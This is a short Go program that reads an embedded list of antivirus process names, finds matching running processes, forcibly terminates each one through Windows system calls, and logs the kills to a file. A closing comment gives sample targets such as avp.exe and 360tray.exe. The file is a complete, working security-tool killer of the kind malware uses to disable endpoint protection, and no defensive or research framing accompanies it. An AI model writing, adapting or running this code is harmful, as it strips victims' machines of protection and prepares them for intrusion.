package main

import (
	_ "embed"
	"fmt"
	"os"
	"runtime"
	"strings"
	"syscall"

	ps "github.com/mitchellh/go-ps"
)

//go:embed AvList.txt
var avList string

func TerminateProcess(process os.Process, exitCode int) error {
	h, e := syscall.OpenProcess(syscall.PROCESS_TERMINATE, false, uint32(process.Pid))
	if e != nil {
		return os.NewSyscallError("OpenProcess", e)
	}
	defer syscall.CloseHandle(h)
	e = syscall.TerminateProcess(h, uint32(exitCode))
	if e != nil {
		return os.NewSyscallError("TerminateProcess", e)
	}
	runtime.KeepAlive(process)
	return nil
}

var f *os.File

func isAv(name string) bool {
	name = strings.ToLower(name)
	for _, each := range strings.Split(avList, "\n") {
		//fmt.Fprintf(f, "isAV: %s == %s\n", name, each)
		if name == strings.ToLower(each) {
			return true
		}
	}
	return false
}

func main() {
	list, err := ps.Processes()
	if err != nil {
		panic(err)
	}
	f, err = os.Create("kill.log")
	if err != nil {
		panic(err)
	}
	defer f.Close()
	for _, each := range list {
		if !isAv(each.Executable()) {
			continue
		}
		fmt.Printf("Kill: %s\n", each.Executable())
		fmt.Fprintf(f, "Kill: %s\n", each.Executable())
		p := os.Process{
			Pid: each.Pid(),
		}
		TerminateProcess(p, 1)
	}
}

/*
anti-virus.exe
avp.exe
360tray.exe


*/
